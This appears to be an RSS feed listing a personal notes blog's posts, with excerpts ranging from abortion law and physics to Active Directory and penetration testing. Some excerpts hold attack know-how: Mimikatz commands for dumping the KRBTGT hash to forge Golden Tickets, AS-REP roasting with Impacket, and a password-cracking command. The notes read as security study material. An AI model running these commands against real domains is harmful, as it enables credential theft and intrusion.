<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Owlglass</title>
    <link>https://kdbed.github.io/posts/</link>
    <description>Recent content in Posts on Owlglass</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <atom:link href="https://kdbed.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Abortion</title>
      <link>https://kdbed.github.io/posts/abortion/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/abortion/</guid>
      <description></description>
    </item>
    <item>
      <title>Abortion and the Supreme Court: Roe V Wade, Dobbs V Jackson, etc</title>
      <link>https://kdbed.github.io/posts/roevwade/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/roevwade/</guid>
      <description>Abortion and the Supreme Court Roe V Wade Basic Conclusions - Roe Drawing on the First, Fourth, Ninth, and Fourteenth Amendments, the Court said that the Constitution protects an individual’s “zones of privacy.” Citing earlier cases that ruled that contraception, marriage, and child rearing were activities included in these “zones of privacy,” the Court found that the zone was “broad enough to encompass a woman’s decision whether or not to terminate her pregnancy.</description>
    </item>
    <item>
      <title>Abundance Politics</title>
      <link>https://kdbed.github.io/posts/abundance_politics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/abundance_politics/</guid>
      <description>Abundance Politics Abundance - Klein, Thompson Vox - Eric Levitz Politico - EV chargers The Baffler - Malcolm Harris Roosevelt Institute - Disgorge the Cash Guardian - Noah Kazis The American Prospect - Dylan Gyauch-Lewis Washington Monthly - Glastris, Weisberg Slow Boring - Yglesias Democracy - Mike Konczal Jacobin - Matt Bruenig The Lever - David Sirota, Aaron Regunberg </description>
    </item>
    <item>
      <title>Account Lockout - Splunk</title>
      <link>https://kdbed.github.io/posts/account_lockout_splunk/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/account_lockout_splunk/</guid>
      <description>Monitoring Active Directory account lockouts with Splunk&#xA;index=wineventlog Account_Name=&amp;lt;&amp;lt;accountNameHere&amp;gt;&amp;gt;&amp;gt; (EventCode=4740 OR EventCode=4625 OR EventCode=644 OR EventCode=529 OR EventCode=675 OR EventCode=676 OR EventCode=681 OR EventCode=4771 OR EventCode=4770 OR EventCode=4768 OR EventCode=4776 OR EventCode=4777 OR EventCode=4725 OR EventCode=4723 OR EventCode=4724 OR EventCode=4767 OR EventCode=4800 OR EventCode=4801) | eval Account0=mvindex(Account_Name,0) | eval Account1=mvindex(Account_Name,1) | eval Account=case(EventCode==4624,Account1, EventCode==4625,Account1, EventCode==4648,Account1, EventCode==4722,Account1, EventCode==4723,Account1, EventCode==4724,Account1, EventCode==4725,Account1, EventCode==4738,Account1, EventCode==4740,Account1, EventCode==4767,Account1, EventCode==4768,Account0, EventCode==4769,Account0, EventCode==4771,Account0, EventCode==4770,Account0, EventCode==5140,Account0, EventCode==4778,Account0, EventCode==4779,Account0, EventCode==4800,Account0, EventCode==4801,Account0) | fillnull Value=&amp;#34;-&amp;#34; Account | eval ActionBy=case(EventCode==4725,Account0, EventCode==4722,src_user, EventCode==4767,src_user, EventCode==4723,src_user, EventCode==4724,src_user, EventCode==4738,src_user, EventCode==4794,src_user) | eval Time=strftime(_time, &amp;#34;%m/%d/%y %H:%M:%S&amp;#34;) | sort -_time | eval Caller_Machine=if(Caller_Machine_Name!</description>
    </item>
    <item>
      <title>Active Directory</title>
      <link>https://kdbed.github.io/posts/active_directory/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/active_directory/</guid>
      <description></description>
    </item>
    <item>
      <title>Active Directory: lastLogon vs lastLogonTimestamp</title>
      <link>https://kdbed.github.io/posts/lastlogon_vs_lastlogontimestamp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/lastlogon_vs_lastlogontimestamp/</guid>
      <description>lastLogon vs lastLogonTimestamp lastLogon The lastLogon attribute contains a Windows FileTime representation of the last time a domain controller successfully authenticated the user. It is the granddaddy of user logon metadata, having been around since the first version Active Directory.&#xA;Using the PowerShell command below, you can retrieve the last logon time and other user properties on a domain controller:&#xA;1 Get-ADUser -Filter * -Properties lastLogon | Select samaccountname,@{Name=&amp;#34;lastLogon&amp;#34;;Expression={[datetime]::FromFileTime($_.&amp;#39;lastLogon&amp;#39;)}} The LastLogon attribute is updated every time a domain controller successfully processes a logon request, but it is not a replicated attribute.</description>
    </item>
    <item>
      <title>Active Scanning with Scapy</title>
      <link>https://kdbed.github.io/posts/scapy_scanning/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/scapy_scanning/</guid>
      <description>Scanning Networks with Scapy Nmap implements several types of scans and can be used to detect the versions of operating systems and services; it can also perform custom vulnerability scanning. Here we&amp;rsquo;ll implement a couple of simple scans using scapy in Python.&#xA;SYN scan : A SYN scan sends a TCP SYN packet to a port and looks for a SYN/ACK packet in response. DNS scan : A DNS scan tests whether a DNS server is running on the target system.</description>
    </item>
    <item>
      <title>Affine and Projective Spaces</title>
      <link>https://kdbed.github.io/posts/affine_and_projective_spaces/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/affine_and_projective_spaces/</guid>
      <description>Affine and Projective Spaces </description>
    </item>
    <item>
      <title>Algorithms</title>
      <link>https://kdbed.github.io/posts/algorithms/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/algorithms/</guid>
      <description></description>
    </item>
    <item>
      <title>Ansible - Playbook weaponization</title>
      <link>https://kdbed.github.io/posts/ansible_playbook_weaponization/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/ansible_playbook_weaponization/</guid>
      <description>https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/</description>
    </item>
    <item>
      <title>Application Shimming</title>
      <link>https://kdbed.github.io/posts/application_shimming/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/application_shimming/</guid>
      <description>Application Shimming https://intel471.com/blog/threat-hunt-deep-dives-application-shimming%20</description>
    </item>
    <item>
      <title>AS-REP Roasting</title>
      <link>https://kdbed.github.io/posts/as_rep_roasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/as_rep_roasting/</guid>
      <description>AS-REP Roasting Two key attacks on Kerberos security in Active Directory include kerberoasting and AS-REP Roasting. Kerberoasting typically requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.&#xA;Use the Impacket tool GetNPUsers.py to try to get a hash for each user</description>
    </item>
    <item>
      <title>Binary Analysis</title>
      <link>https://kdbed.github.io/posts/binary_analysis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/binary_analysis/</guid>
      <description></description>
    </item>
    <item>
      <title>Birthday Attack</title>
      <link>https://kdbed.github.io/posts/birthdayattack/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/birthdayattack/</guid>
      <description>Birthday Attack The birthday attack is named after the birthday paradox. The name is based on fact that in a room with 23 people or more, the odds are greater than 50% that two will share the same birthday. Many find this counterintuitive, and the birthday paradox illustrates why many people’s instinct on probability (and risk) is wrong. You are not trying to match a specific birthday (such as yours); you are trying to match any birthday.</description>
    </item>
    <item>
      <title>Breadth-first Search</title>
      <link>https://kdbed.github.io/posts/breadth_first_search/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/breadth_first_search/</guid>
      <description>Breadth-first Search Algorithm The Breadth-First Search (BFS) algorithm is used to traverse or search a graph or tree data structure. It explores all the nodes at the current depth level before moving on to the nodes at the next depth level. BFS is often used to find the shortest path between two nodes in an unweighted graph.&#xA;import ast def convert_input_to_grid(input_string): # Use ast.literal_eval to safely evaluate the string into a list of lists grid = ast.</description>
    </item>
    <item>
      <title>C Programming</title>
      <link>https://kdbed.github.io/posts/c_programming/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/c_programming/</guid>
      <description>C Programming Basics Code Analysis clang-tidy static code analysis tool - clang-tidy checks Security standards : SEI CERT C Coding Standard : https://wiki.sei.cmu.edu/confluence/display/c Secure Coding in C and C++, 2/e by Robert Seacord </description>
    </item>
    <item>
      <title>C&#43;&#43; - STL</title>
      <link>https://kdbed.github.io/posts/c_stl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/c_stl/</guid>
      <description></description>
    </item>
    <item>
      <title>C&#43;&#43; and Nix</title>
      <link>https://kdbed.github.io/posts/cpp_proj_nix/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/cpp_proj_nix/</guid>
      <description>Template Project in C++ using Nix Taken from this blog post.&#xA;Creating a C++ project Create a sample C++ project with the following dependencies&#xA;C++ compiler, of course. That might be GCC or Clang. Boost Poco The program does nothing more than printing what compiler it was built with and which versions of boost and poco it is linked against.&#xA;Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include &amp;lt;boost/lexical_cast.</description>
    </item>
    <item>
      <title>C&#43;&#43; Programming</title>
      <link>https://kdbed.github.io/posts/cpp_programming/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/cpp_programming/</guid>
      <description>Basics Hello world 1 2 3 4 5 #include &amp;lt;iostream&amp;gt; int main(){ std::cout &amp;lt;&amp;lt; &amp;#34;Hello, world.&amp;#34; &amp;lt;&amp;lt; std::endl; } Templates Basic Template 1 2 3 4 5 6 7 8 9 10 11 12 13 #include &amp;lt;iostream&amp;gt; template&amp;lt;typename T&amp;gt; T add_em_up(T&amp;amp; lhs, T&amp;amp; rhs){ return lhs + rhs; } int main(){ int a{ 72 }; int b{ 47 }; std::cout &amp;lt;&amp;lt; add_em_up&amp;lt;int&amp;gt;(a,b) &amp;lt;&amp;lt; &amp;#34;\n&amp;#34;; } </description>
    </item>
    <item>
      <title>Category Theory</title>
      <link>https://kdbed.github.io/posts/category_theory/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/category_theory/</guid>
      <description></description>
    </item>
    <item>
      <title>Collatz conjecture</title>
      <link>https://kdbed.github.io/posts/collatz_conjecture/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/collatz_conjecture/</guid>
      <description>Collatz conjecture The Collatz conjecture[a] is one of the most famous unsolved problems in mathematics. The conjecture asks whether repeating two simple arithmetic operations will eventually transform every positive integer into 1. It concerns sequences of integers in which each term is obtained from the previous term as follows: if a term is even, the next term is one half of it. If a term is odd, the next term is 3 times the previous term plus 1.</description>
    </item>
    <item>
      <title>ComptTIA Security&#43;</title>
      <link>https://kdbed.github.io/posts/securityplus/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/securityplus/</guid>
      <description></description>
    </item>
    <item>
      <title>Computer Science</title>
      <link>https://kdbed.github.io/posts/computer_science/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/computer_science/</guid>
      <description></description>
    </item>
    <item>
      <title>Conditions of Causation</title>
      <link>https://kdbed.github.io/posts/conditions_of_causation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/conditions_of_causation/</guid>
      <description>Conditions of Causality There are four conditions of causality: logical time ordering, correlation, mechanism, and nonspuriousness. Logical time ordering refers to the idea that one variable needs to precede another variable in time for the first variable to influence the second variable. For example, throughout the world, people are protesting their governments. In some countries, governments respond with the metaphorical yawn. However, in other countries, the governments may respond with repressive tactics.</description>
    </item>
    <item>
      <title>Cracking - PDF</title>
      <link>https://kdbed.github.io/posts/cracking_pdf/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/cracking_pdf/</guid>
      <description>fcrackzip fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt </description>
    </item>
    <item>
      <title>Data Transfer</title>
      <link>https://kdbed.github.io/posts/data_transfer/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/data_transfer/</guid>
      <description>Data Transfer certutil </description>
    </item>
    <item>
      <title>DLL Hijacking</title>
      <link>https://kdbed.github.io/posts/dll_hijacking/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/dll_hijacking/</guid>
      <description>Basic Ideas Windows DLL hijacking occurs when a trusted or legitimate application is tricked into loading an arbitrary DLL. Dll hijacking can be used to execute code, obtain persistence and escalate privileges, although privilege escalation is the least likely. hackTricks&#xA;Approaches There are different approaches to DLL hijacking, and success will be determined by how the application is set to load its DLLs.</description>
    </item>
    <item>
      <title>DLL Injection</title>
      <link>https://kdbed.github.io/posts/dll_injection/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/dll_injection/</guid>
      <description>DLL Injection API Hooks https://www.apriorit.com/dev-blog/679-windows-dll-injection-for-api-hooks https://www.apriorit.com/dev-blog/160-apihooks%20https://www.apriorit.com/dev-blog/727-win-guide-to-hooking-windows-apis-with-python%20</description>
    </item>
    <item>
      <title>DNS - Basics</title>
      <link>https://kdbed.github.io/posts/dns_basics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/dns_basics/</guid>
      <description>Domain Name System (DNS) The Domain Name System (DNS) is a distributed database responsible for translating domain names into IP addresses. It&amp;rsquo;s composed of a hierarchical structure that is divided into several zones, starting with the top-level root zone.&#xA;Each domain can use different types of DNS records. Some of the most common types of DNS records include:&#xA;NS: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.</description>
    </item>
    <item>
      <title>DNS Zone Transfers</title>
      <link>https://kdbed.github.io/posts/dnszonetransfers/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/dnszonetransfers/</guid>
      <description>DNS Zone Transfers DNS zone transfers using the AXFR protocol are the simplest mechanism to replicate DNS records across DNS servers. To avoid the need to edit information on multiple DNS servers, you can edit information on one server and use AXFR to copy information to other servers. However, if you do not protect your servers, malicious parties may use AXFR to get information about all your hosts.&#xA;How DNS Works DNS (Domain Name System) is like an Internet phonebook.</description>
    </item>
    <item>
      <title>Document Object Model (DOM)</title>
      <link>https://kdbed.github.io/posts/document_object_model_dom/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/document_object_model_dom/</guid>
      <description>Document Object Model (DOM) </description>
    </item>
    <item>
      <title>Dopamine</title>
      <link>https://kdbed.github.io/posts/dopamine/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/dopamine/</guid>
      <description></description>
    </item>
    <item>
      <title>Eikonal Approximation</title>
      <link>https://kdbed.github.io/posts/eikonal_approximation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/eikonal_approximation/</guid>
      <description>Eikonal Approximation in Quantum Mechanics Introduction and Background The root eikon comes from eikenai, a transliteration of the Greek \(\epsilon\iota\kappa\epsilon\nu\alpha\iota\) meaning &amp;rsquo;to resemble&amp;rsquo;. In Greek the word \(\epsilon\iota\kappa\omicron\nu\) means image &amp;ndash; compare &amp;lsquo;icon&amp;rsquo; in English. The image provided by the eikonal approximation in scattering has its origin in optics, wherein one assumes (ray optics) that the size of an obstacle is large compared to the wavelength of scattered light. When diffraction is involved, one moves from the eikonal approximation (back) to Maxwell&amp;rsquo;s Equations.</description>
    </item>
    <item>
      <title>Electrodynamics</title>
      <link>https://kdbed.github.io/posts/electrodynamics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/electrodynamics/</guid>
      <description>Physics&#xA;Electrodynamics </description>
    </item>
    <item>
      <title>Endpoint Detection and Response</title>
      <link>https://kdbed.github.io/posts/endpoint_detection_and_response/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/endpoint_detection_and_response/</guid>
      <description>Endpoint Detection and Response Basics Generally, EDRs are applications installed on a target&amp;rsquo;s endpoints that collect data about the security of the environment - telemetry.&#xA;Components Agent: an application that controls and consumes data from sensor components, performs some basic threat analysis, and forwards the telemetry to the main server, which further analyzes events from all agents deployed in an environment. In response to activity deemed malicious, the agent may: log that malicious activity, sending an alert to a central logging system &amp;ndash; eg the EDR’s dashboard or a security incident and event management (SIEM) solution block the malicious operation’s execution by returning values indicating failure to the program that is performing the action deceive the attacker by returning to the caller invalid values, such as incorrect memory addresses or modified access masks, causing the offensive tooling to believe that the operation completed successfully even though subsequent operations will fail Telemetry: the raw data generated by a sensor component or the host.</description>
    </item>
    <item>
      <title>File Manipulation</title>
      <link>https://kdbed.github.io/posts/file_manipulation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/file_manipulation/</guid>
      <description>exiftool Use exiftool to check a document&amp;rsquo;s metadata:&#xA;1 exiftool test.docx </description>
    </item>
    <item>
      <title>Fileless Malware</title>
      <link>https://kdbed.github.io/posts/fileless_malware/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/fileless_malware/</guid>
      <description>What is Fileless Malware? Traditionally, antivirus and other endpoint security products have focused on files (executables) to detect and prevent malware. There are several advantages to this. Files can be hashed, queried in reputation services, examined by both static analysis and machine learning, and easily excluded for false detections.&#xA;This is a problem for hackers: if the malware’s signature is detected two days after release, the attacker’s ROI (return on investment) may be significantly less than expected, or even negligible.</description>
    </item>
    <item>
      <title>FTP - retrieve files with Python</title>
      <link>https://kdbed.github.io/posts/ftp_retrieve_files_with_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/ftp_retrieve_files_with_python/</guid>
      <description></description>
    </item>
    <item>
      <title>FTP - retrieve files with Python</title>
      <link>https://kdbed.github.io/posts/pentest_ftp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_ftp/</guid>
      <description>FTP file download 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #!/usr/bin/python3 # # script to login with ftp, print the directory contents # and retrieve the files # # example: python3 ftp_python.py 8.8.8.8 &amp;#39;user&amp;#39; &amp;#39;password&amp;#39; from ftplib import FTP import sys import os ip = str(sys.argv[1]) name = str(sys.</description>
    </item>
    <item>
      <title>Generative Effects: Orders and Galois Connections</title>
      <link>https://kdbed.github.io/posts/generativeeffects/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/generativeeffects/</guid>
      <description>Introduction From An Invitation to Applied Category Theory - Seven Sketches in Compositionality &amp;ndash; Fong/Spivak&#xA;A wide variety of situations exhibit something called compositionality &amp;ndash; wherein systems or relationships can be combined to form new systems or relationships. Category-theoretic constructs can be used to describe the compositionality in such situations. A structural approach to modeling with Category Theory : introduction.&#xA;More Than the Sum of Their Parts </description>
    </item>
    <item>
      <title>Golden SAML</title>
      <link>https://kdbed.github.io/posts/golden_saml/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/golden_saml/</guid>
      <description>Golden SAML https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps</description>
    </item>
    <item>
      <title>Golden Ticket</title>
      <link>https://kdbed.github.io/posts/golden_ticket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/golden_ticket/</guid>
      <description>Golden Ticket A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the KRBTGT account’s NTLM hash. Once created, it can be used to impersonate any user in the domain, including domain admins, and grants unlimited access to services in the domain.&#xA;Overview Forged TGT signed with the KRBTGT hash Bypasses domain authentication controls Can impersonate any user in the domain Prerequisites SYSTEM or Domain Admin privileges on a domain-joined machine Access to the NTLM hash of the KRBTGT account Knowledge of: Domain SID Domain name (Optional) actual usernames Key Concepts KRBTGT account: Used by KDC to sign/encrypt TGTs SID: Used to tie forged ticket to domain TGT: Ticket Granting Ticket (used to request service tickets) Mimikatz Commands Dump KRBTGT Hash mimikatz # privilege::debug mimikatz # lsadump::lsa /inject /name:krbtgt Look for: Hash NTLM: a2c0b1f65a098dc5b3e3479e9d88cb5e</description>
    </item>
    <item>
      <title>Google Hacking</title>
      <link>https://kdbed.github.io/posts/google_hacking/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/google_hacking/</guid>
      <description>Operators ahrefs </description>
    </item>
    <item>
      <title>Greenhouse Gas Emissions</title>
      <link>https://kdbed.github.io/posts/greenhouseemissions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/greenhouseemissions/</guid>
      <description>Raw Numbers Fifty-one billion is how many tons of greenhouse gases the world typically adds to the atmosphere every year. &amp;ndash;Bill Gates, How to Avoid a Climate Disaster (2021)</description>
    </item>
    <item>
      <title>Happiness</title>
      <link>https://kdbed.github.io/posts/happiness/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/happiness/</guid>
      <description></description>
    </item>
    <item>
      <title>Hashing Vs Encryption</title>
      <link>https://kdbed.github.io/posts/hashing_vs_encryption/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/hashing_vs_encryption/</guid>
      <description>The difference between hashing and encryption The difference betwen hashing and encryption determines how likely an exposed password can be abused after a breach. Hashing is such that it can&amp;rsquo;t be directly reversed (hash &amp;ndash;&amp;gt; plaintext), but the plaintext can be guessed by hashing a large number of candidates and comparing the results. Password hashing is one-way and deterministic. This means that sites that store hashes never actually keep the password, but re-hashing at logon provides a reliable point of comparison.</description>
    </item>
    <item>
      <title>Haskell Programming</title>
      <link>https://kdbed.github.io/posts/haskelltest/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/haskelltest/</guid>
      <description>Basics **&#xA;Map import Control.Monad :{ map (\x -&amp;gt; x*x + x + 10) [1..10] :} 12 16 22 30 40 52 66 82 100 120 Applications Derivatives -- | alias R to be a Double as an approximate of a real number type R = Double type Time = R type Position = R type Derivative = (R -&amp;gt; R) -&amp;gt; R -&amp;gt; R derivative :: R -&amp;gt; Derivative derivative dt x t = (x (t + dt/2) - x(t - dt/2)) / dt carPosition :: Time -&amp;gt; Position carPosition t = cos t carVelocity :: Time -&amp;gt; Velocity carVelocity = derivative 0.</description>
    </item>
    <item>
      <title>Home Ownership</title>
      <link>https://kdbed.github.io/posts/home_ownership/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/home_ownership/</guid>
      <description>Home Ownership https://www.theatlantic.com/newsletters/archive/2022/12/homeownership-real-estate-investment-renting/672511/%20</description>
    </item>
    <item>
      <title>Hooking Windows APIs with Python</title>
      <link>https://kdbed.github.io/posts/hooking_windows_apis_with_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/hooking_windows_apis_with_python/</guid>
      <description>Windows API Hooking The Hook API hooking refers to techniques for changing or extending the behavior of an OS or app by intercepting API function calls, messages, or events passed between software components. The code that performs the interception is called a hook. In Windows this can be done by injecting DLLs, injecting code, and using the Win32 Debug API toolset.&#xA;References apriorit</description>
    </item>
    <item>
      <title>HTTP/2</title>
      <link>https://kdbed.github.io/posts/http_2/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/http_2/</guid>
      <description>https://portswigger.net/research/http2&#xA;Request smuggling https://lab.wallarm.com/http2smugl-http2-request-smuggling-security-testing-tool/</description>
    </item>
    <item>
      <title>icacls</title>
      <link>https://kdbed.github.io/posts/icacls/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/icacls/</guid>
      <description>icacls Propagate a single Suppose we need to push a single ACE through subdirectories:&#xA;icacls &amp;#34;X:\PATH\TO\FOLDER\&amp;#34; /grant DOMAIN\group:(f) /t MS learn.microsoft</description>
    </item>
    <item>
      <title>IdentityIQEssentialsIntroduction</title>
      <link>https://kdbed.github.io/posts/identityiqessentialsintroduction/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/identityiqessentialsintroduction/</guid>
      <description>Introduction Reading data: all systems from which data is read are called applications. Identity cubes created when aggregating accounts from an authoritative application (system of record), e.g., HR system or AD. Business modeling Governance Process Provisioning Process : User Request; Lifecycle event </description>
    </item>
    <item>
      <title>Impacket</title>
      <link>https://kdbed.github.io/posts/impacket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/impacket/</guid>
      <description></description>
    </item>
    <item>
      <title>Impacket - Secrets Dump</title>
      <link>https://kdbed.github.io/posts/impacket_secrets_dump/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/impacket_secrets_dump/</guid>
      <description>Impacket - SecretsDump secretsdump is a tool in the Impacket collection that extracts account secrets from a Windows domain — typically NT/NTLM password hashes, cached credentials, and other LSA secrets. It supports multiple modes (offline extraction from files, or remote extraction using replication/LSA APIs). The important point: the tool reads encrypted credential data and then uses system key material to decrypt it so the raw hashes/credentials become visible.&#xA;NTDS.dit NTDS.dit is the main Active Directory database (an Extensible Storage Engine / ESE database).</description>
    </item>
    <item>
      <title>Information Security</title>
      <link>https://kdbed.github.io/posts/information_security/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/information_security/</guid>
      <description>Computer Science</description>
    </item>
    <item>
      <title>Internet Security Association and Key Management Protocol (ISAKMP)</title>
      <link>https://kdbed.github.io/posts/isakmp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/isakmp/</guid>
      <description>Internet Security Association and Key Management Protocol (ISAKMP) Wiki Overview ISAKMP defines the procedures for authenticating a communicating peer, creation and management of Security Associations, key generation techniques and threat mitigation (e.g. denial of service and replay attacks). As a framework,[1] ISAKMP typically utilizes IKE for key exchange, although other methods have been implemented such as Kerberized Internet Negotiation of Keys. A Preliminary SA is formed using this protocol; later a fresh keying is done.</description>
    </item>
    <item>
      <title>Intro to Pwntools - TryHackMe</title>
      <link>https://kdbed.github.io/posts/introtopwntools/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/introtopwntools/</guid>
      <description>Basics of Binary Analysis&#xA;Intro to Pwntools Source materials here dizmascyberlabs Install gdb-pwndbg-peda-gef&#xA;Checksec Same source code, compiled with different protections in place:&#xA;1 checksec checksec/intro2pwn2 [*] &amp;#39;/home/kdb/Downloads/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 1 checksec checksec/intro2pwn1 [*] &amp;#39;/home/kdb/Downloads/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1&amp;#39; Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RELRO = Relocation Read-Only; makes the global offset table (GOT) read-only after the linker resolves functions to it.</description>
    </item>
    <item>
      <title>Inverse-Square Potential in Quantum Mechanics</title>
      <link>https://kdbed.github.io/posts/inverse_square_potential_in_quantum_mechanics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/inverse_square_potential_in_quantum_mechanics/</guid>
